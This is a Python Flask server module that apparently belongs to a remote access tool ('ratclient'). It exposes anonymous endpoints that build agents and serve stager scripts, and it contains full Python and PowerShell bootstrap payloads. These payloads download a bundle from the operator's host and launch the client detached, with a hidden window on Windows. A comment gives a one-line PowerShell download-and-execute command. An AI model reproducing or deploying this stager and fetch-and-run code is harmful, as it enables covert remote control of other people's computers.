from flask import Blueprint, send_file

from server.web.api_response import WebApiResponder
from server.web.auth_guard import allow_anonymous
from server.web.request_parsers import get_json_payload


def create_agent_blueprint(server_instance):
    blueprint = Blueprint('agent', __name__)
    web_service = server_instance.web_service
    agent_api = web_service.agent_api
    responder = WebApiResponder()

    @blueprint.post('/api/agent/build')
    @allow_anonymous
    def build_agent():
        """构建 Agent"""

        def _execute():
            payload = get_json_payload()
            server_host = (payload.get('server_host') or '').strip()
            server_port = payload.get('server_port')
            web_port = payload.get('web_port')
            target_os = (payload.get('target_os') or 'mac').strip()
            builder = (payload.get('builder') or 'pyinstaller').strip()
            target_arch = (payload.get('target_arch') or '').strip()
            server_web_scheme = (payload.get('server_web_scheme') or 'http').strip() or 'http'
            server_web_host = (payload.get('server_web_host') or server_host).strip() or server_host
            source = (payload.get('source') or 'manual').strip() or 'manual'

            if not server_host:
                raise ValueError('server_host is required')
            if not server_port:
                raise ValueError('server_port is required')
            if not web_port:
                raise ValueError('web_port is required')

            try:
                server_port = int(server_port)
            except ValueError:
                raise ValueError('server_port must be integer')

            try:
                web_port = int(web_port)
            except ValueError:
                raise ValueError('web_port must be integer')

            result = agent_api.build_agent(
                server_host,
                server_port,
                web_port,
                target_os,
                builder,
                target_arch,
                server_web_scheme,
                server_web_host,
                source,
            )
            result['download_url'] = f'/api/agent/download/{result["file_name"]}'
            return result

        return responder.json_endpoint(_execute, default_error_status=500)

    @blueprint.get('/api/agent/outputs')
    def list_agent_outputs():
        return responder.json_endpoint(
            lambda: agent_api.list_agent_outputs(),
            default_error_status=500,
        )

    @blueprint.delete('/api/agent/outputs/<filename>')
    def delete_agent_output(filename):
        return responder.json_endpoint(
            lambda: agent_api.delete_agent_output(filename),
            default_error_status=500,
        )

    @blueprint.get('/api/agent/download/<filename>')
    @allow_anonymous
    def download_agent(filename):
        """下载构建好的 Agent"""
        try:
            file_path = agent_api.get_built_agent_file_path(filename)
            return send_file(
                file_path,
                as_attachment=True,
                download_name=filename,
            )
        except FileNotFoundError as e:
            return responder.fail(str(e), 404)
        except Exception as e:
            return responder.map_common_error(e)

    @blueprint.get('/api/agent/platform')
    def get_agent_platform():
        return responder.json_endpoint(
            lambda: agent_api.get_server_platform(),
            default_error_status=500,
        )

    @blueprint.post('/api/agent/loader/report')
    @allow_anonymous
    def ingest_loader_report():
        return responder.json_endpoint(
            lambda: agent_api.ingest_loader_report(get_json_payload()),
            default_error_status=500,
        )

    @blueprint.delete('/api/agent/cleanup')
    def cleanup_agent_build():
        """清理构建临时文件"""

        def _execute():
            payload = get_json_payload()
            work_dir = (payload.get('work_dir') or '').strip()
            return agent_api.cleanup_agent_build(work_dir)

        return responder.json_endpoint(_execute)

    # temp
    @blueprint.post('/api/agent/bootstrap')
    @allow_anonymous
    def generate_bootstrap():
        try:
            payload = get_json_payload()
            server_host = (payload.get('server_host') or '').strip()
            server_port = payload.get('server_port')
            web_port = payload.get('web_port')

            if not server_host:
                return responder.fail('server_host is required', 400)
            if not server_port:
                return responder.fail('server_port is required', 400)
            if not web_port:
                return responder.fail('web_port is required', 400)

            try:
                server_port = int(server_port)
            except (ValueError, TypeError):
                return responder.fail('server_port must be integer', 400)

            web_host = server_host
            web_scheme = 'http'

            script_content = generate_bootstrap_script(
                server_host, server_port, web_host, web_port, web_scheme
            )

            import tempfile
            with tempfile.NamedTemporaryFile(
                    mode='w', suffix='.py', delete=False, encoding='utf-8'
            ) as f:
                f.write(script_content)
                temp_path = f.name

            return send_file(
                temp_path,
                as_attachment=True,
                download_name='bootstrap.py',
                mimetype='text/x-python'
            )
        except Exception as e:
            return responder.map_common_error(e)

    @blueprint.post('/api/agent/bootstrap/ps1')
    @allow_anonymous
    def generate_bootstrap_ps1():
        try:
            payload = get_json_payload()
            server_host = (payload.get('server_host') or '').strip()
            server_port = payload.get('server_port')
            web_port = payload.get('web_port')

            if not server_host:
                return responder.fail('server_host is required', 400)
            if not server_port:
                return responder.fail('server_port is required', 400)
            if not web_port:
                return responder.fail('web_port is required', 400)

            try:
                server_port = int(server_port)
                web_port = int(web_port)
            except (ValueError, TypeError):
                return responder.fail('server_port and web_port must be integer', 400)

            script_content = generate_bootstrap_ps1_script(
                server_host, server_port, web_port
            )

            import tempfile
            with tempfile.NamedTemporaryFile(
                    mode='w', suffix='.ps1', delete=False, encoding='utf-8'
            ) as f:
                f.write(script_content)
                temp_path = f.name

            return send_file(
                temp_path,
                as_attachment=True,
                download_name='bootstrap.ps1',
                mimetype='text/plain'
            )
        except Exception as e:
            return responder.map_common_error(e)

    return blueprint


def generate_bootstrap_script(server_host, server_port, web_host, web_port, web_scheme='http'):
    script = f'''# bootstrap.py - Cross-platform bootstrap script
# Generated by server API
import os, sys, time, shutil, zipfile, runpy, threading, json, platform, subprocess
from urllib.parse import urljoin
import requests

WEB_HOST = "{web_host}"
WEB_PORT = {web_port}
WEB_SCHEME = "{web_scheme}"
SERVER_HOST = "{server_host}"
SERVER_PORT = {server_port}

BASE_URL = f"{{WEB_SCHEME}}://{{WEB_HOST}}:{{WEB_PORT}}"
RELEASE_DIR = os.path.join(os.path.expanduser("~"), "Documents", "client_bundle", "releases")

def log(msg):
    print(f"[bootstrap] {{msg}}")

def ensure_dir(path):
    os.makedirs(path, exist_ok=True)
    return path

def is_pythonista():
    try:
        import appex
        return True
    except ImportError:
        return sys.platform == 'ios'

def build_bundle():
    url = urljoin(BASE_URL + "/", "/api/agent/build")
    payload = {{
        "server_host": SERVER_HOST,
        "server_port": SERVER_PORT,
        "server_web_scheme": WEB_SCHEME,
        "server_web_host": WEB_HOST,
        "web_port": WEB_PORT,
        "target_os": "bundle",
        "builder": "bundle",
        "target_arch": "",
        "source": "bootstrap",
    }}
    log(f"build request: {{url}}")
    r = requests.post(url, json=payload, timeout=300)
    r.raise_for_status()
    data = r.json()
    if isinstance(data, dict) and "code" in data:
        if data.get("code") != 0:
            raise RuntimeError(data.get("message") or data)
        return data.get("data") or {{}}
    return data

def download_file(download_url, save_path):
    log(f"download: {{download_url}}")
    r = requests.get(download_url, stream=True, timeout=300)
    r.raise_for_status()
    tmp_path = save_path + ".part"
    with open(tmp_path, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024 * 64):
            if chunk:
                f.write(chunk)
    if os.path.exists(save_path):
        os.remove(save_path)
    os.rename(tmp_path, save_path)
    return save_path

def unzip(zip_path, extract_dir):
    if os.path.isdir(extract_dir):
        shutil.rmtree(extract_dir)
    os.makedirs(extract_dir, exist_ok=True)
    log(f"extract: {{extract_dir}}")
    with zipfile.ZipFile(zip_path, "r") as z:
        z.extractall(extract_dir)
    return extract_dir

def start_ratclient(bundle_dir):
    ratclient_path = os.path.join(bundle_dir, "ratclient.py")
    if not os.path.isfile(ratclient_path):
        raise FileNotFoundError(f"ratclient.py not found: {{ratclient_path}}")

    if is_pythonista():
        log("iOS/Pythonista detected, using runpy mode")
        def runner():
            os.chdir(bundle_dir)
            if bundle_dir not in sys.path:
                sys.path.insert(0, bundle_dir)
            sys.argv = [ratclient_path]
            runpy.run_path(ratclient_path, run_name="__main__")
        t = threading.Thread(target=runner, name="ratclient-main")
        t.daemon = False
        t.start()
        return t
    else:
        log(f"Desktop detected ({{sys.platform}}), using subprocess detached mode")
        cmd = [sys.executable, ratclient_path]
        if sys.platform == 'win32':
            flags = 0x00000200 | 0x00000008
            return subprocess.Popen(
                cmd, cwd=bundle_dir,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                creationflags=flags, close_fds=True
            )
        else:
            return subprocess.Popen(
                cmd, cwd=bundle_dir,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True, close_fds=True
            )

def main():
    ensure_dir(RELEASE_DIR)
    result = build_bundle()
    download_url = result.get("download_url")
    if not download_url:
        raise RuntimeError(f"missing download_url: {{result}}")
    download_url = urljoin(BASE_URL + "/", download_url)
    file_name = result.get("file_name") or os.path.basename(download_url)
    zip_path = os.path.join(RELEASE_DIR, file_name)
    base_name = os.path.splitext(file_name)[0]
    extract_dir = os.path.join(RELEASE_DIR, base_name)
    download_file(download_url, zip_path)
    unzip(zip_path, extract_dir)
    start_ratclient(extract_dir)
    log("handoff done, bootstrap exits")
    time.sleep(0.2)
    sys.exit(0)

if __name__ == "__main__":
    main()
'''
    return script


#one liner :$ip="192.168.2.242";$p=5173;iwr "http://${ip}:${p}/api/agent/bootstrap/ps1" -Method Post -ContentType "application/json" -UseBasicParsing -Body "{`"server_host`":`"$ip`",`"server_port`":9999,`"web_port`":$p}" -OutFile "$env:TEMP\bootstrap.ps1"; & "$env:TEMP\bootstrap.ps1"
def generate_bootstrap_ps1_script(server_host, server_port, web_port):
    script = f'''$ip="{server_host}"
$webPort={web_port}
$serverPort={server_port}
$bundleDir="$env:USERPROFILE\\client_bundle"
$pyDir="$bundleDir\\python-embed"
$releaseDir="$bundleDir\\releases"
mkdir $bundleDir,$releaseDir -Force | Out-Null

function Unzip-File($zipPath, $destPath) {{
    mkdir $destPath -Force | Out-Null
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $destPath)
}}

# 1. Prepare Python
$py = $null
if (Get-Command python -ErrorAction SilentlyContinue) {{
    $py = "python"
    Write-Host "Found local Python: $py"
}} elseif (Get-Command python3 -ErrorAction SilentlyContinue) {{
    $py = "python3"
    Write-Host "Found local Python: $py"
}}

if (-not $py) {{
    if (Test-Path "$pyDir\\python.exe") {{
        $py = "$pyDir\\python.exe"
        Write-Host "Using cached embedded Python: $py"
    }} else {{
        $found = Get-ChildItem $pyDir -Filter "python.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($found) {{
            $py = $found.FullName
            Write-Host "Using cached embedded Python: $py"
        }}
    }}
}}

if (-not $py) {{
    Write-Host "No Python found, downloading embedded Python..."
    $pyZip = "$bundleDir\\python-embed.zip"
    mkdir $pyDir -Force | Out-Null
    iwr "http://$ip`:$webPort/api/external-tools/python-embed/download?platform=win&arch=amd64" -OutFile $pyZip -UseBasicParsing
    if (-not (Test-Path $pyZip)) {{
        Write-Host "ERROR: Download failed"
        exit 1
    }}
    Write-Host "Downloaded, extracting..."
    Unzip-File $pyZip $pyDir
    $py = Get-ChildItem $pyDir -Filter "python.exe" -Recurse | Select-Object -First 1 -ExpandProperty FullName
    if (-not $py) {{
        Write-Host "ERROR: python.exe not found after extraction"
        exit 1
    }}
    Remove-Item $pyZip -Force
    Write-Host "Embedded Python ready: $py"
}}

# 2. Request bundle build
Write-Host "Requesting bundle build..."
$buildBody = "{{`"server_host`":`"$ip`",`"server_port`":$serverPort,`"web_port`":$webPort,`"target_os`":`"bundle`",`"builder`":`"bundle`",`"target_arch`":`"`",`"source`":`"bootstrap`",`"server_web_scheme`":`"http`",`"server_web_host`":`"$ip`"}}"
$buildResp = iwr "http://$ip`:$webPort/api/agent/build" -Method Post -ContentType "application/json" -UseBasicParsing -Body $buildBody
$buildData = $buildResp.Content | ConvertFrom-Json

if ($buildData.code -ne 0) {{
    Write-Host "Build failed: $($buildData.message)"
    exit 1
}}

$downloadUrl = $buildData.data.download_url
$fileName = $buildData.data.file_name
$buildVersion = $buildData.data.build_version

if (-not $downloadUrl.StartsWith("http")) {{
    $downloadUrl = "http://$ip`:$webPort$downloadUrl"
}}

Write-Host "Build version: $buildVersion"

# 3. Download bundle (always download latest)
$zipPath = "$releaseDir\\$fileName"
Write-Host "Downloading bundle..."
iwr $downloadUrl -OutFile $zipPath -UseBasicParsing
if (-not (Test-Path $zipPath)) {{
    Write-Host "ERROR: Bundle download failed"
    exit 1
}}

# 4. Extract (skip if already extracted)
$extractDir = "$releaseDir\\$buildVersion"
$ratclient = "$extractDir\\ratclient.py"
if (Test-Path $ratclient) {{
    Write-Host "Bundle already extracted, skipping..."
}} else {{
    Write-Host "Extracting to $extractDir..."
    Unzip-File $zipPath $extractDir
}}

# 5. Launch ratclient
if (-not (Test-Path $ratclient)) {{
    Write-Host "ERROR: ratclient.py not found: $ratclient"
    exit 1
}}

Write-Host "Launching ratclient..."
Start-Process -FilePath $py -ArgumentList $ratclient -WorkingDirectory $extractDir -WindowStyle Hidden
Write-Host "Bootstrap complete."
'''
    return script
#
# def generate_bootstrap_ps1_script(server_host, server_port, web_port):
#     script = f'''$ip="{server_host}"
# $webPort={web_port}
# $serverPort={server_port}
# $bundleDir="$env:USERPROFILE\\client_bundle"
# $pyDir="$bundleDir\\python-embed"
# $pyExe="$pyDir\\python.exe"
# $releaseDir="$bundleDir\\releases"
# mkdir $bundleDir,$releaseDir -Force | Out-Null
#
# # 1. Prepare Python
# if (Get-Command python -ErrorAction SilentlyContinue) {{
#     $py = "python"
#     Write-Host "Found local Python: $py"
# }} elseif (Get-Command python3 -ErrorAction SilentlyContinue) {{
#     $py = "python3"
#     Write-Host "Found local Python: $py"
# }} elseif (Test-Path $pyExe) {{
#     $py = $pyExe
#     Write-Host "Using cached embedded Python: $py"
# }} else {{
#     Write-Host "No Python found, downloading embedded Python..."
#     $pyZip = "$pyDir\\python-embed.zip"
#     mkdir $pyDir -Force | Out-Null
#     iwr "http://$ip`:$webPort/api/external-tools/python-embed/download?platform=win&arch=amd64" -OutFile $pyZip -UseBasicParsing
#     Write-Host "Downloaded, extracting..."
#     Expand-Archive $pyZip $pyDir -Force
#     $py = $pyExe
#     Write-Host "Embedded Python ready: $py"
# }}
#
# # 2. Request bundle build
# Write-Host "Requesting bundle build..."
# $buildBody = "{{`"server_host`":`"$ip`",`"server_port`":$serverPort,`"web_port`":$webPort,`"target_os`":`"bundle`",`"builder`":`"bundle`",`"target_arch`":`"`",`"source`":`"bootstrap`",`"server_web_scheme`":`"http`",`"server_web_host`":`"$ip`"}}"
# $buildResp = iwr "http://$ip`:$webPort/api/agent/build" -Method Post -ContentType "application/json" -UseBasicParsing -Body $buildBody
# $buildData = $buildResp.Content | ConvertFrom-Json
#
# if ($buildData.code -ne 0) {{
#     Write-Host "Build failed: $($buildData.message)"
#     exit 1
# }}
#
# $downloadUrl = $buildData.data.download_url
# $fileName = $buildData.data.file_name
# $buildVersion = $buildData.data.build_version
#
# if (-not $downloadUrl.StartsWith("http")) {{
#     $downloadUrl = "http://$ip`:$webPort$downloadUrl"
# }}
#
# Write-Host "Build version: $buildVersion"
#
# # 3. Download bundle
# $zipPath = "$releaseDir\\$fileName"
# Write-Host "Downloading bundle..."
# iwr $downloadUrl -OutFile $zipPath -UseBasicParsing
#
# # 4. Extract
# $extractDir = "$releaseDir\\$buildVersion"
# if (Test-Path $extractDir) {{
#     Remove-Item $extractDir -Recurse -Force
# }}
# Write-Host "Extracting to $extractDir..."
# Expand-Archive $zipPath $extractDir -Force
#
# # 5. Launch ratclient
# $ratclient = "$extractDir\\ratclient.py"
# if (-not (Test-Path $ratclient)) {{
#     Write-Host "ratclient.py not found: $ratclient"
#     exit 1
# }}
#
# Write-Host "Launching ratclient..."
# Start-Process -FilePath $py -ArgumentList $ratclient -WorkingDirectory $extractDir -WindowStyle Hidden
# Write-Host "Bootstrap complete."
# '''
#     return script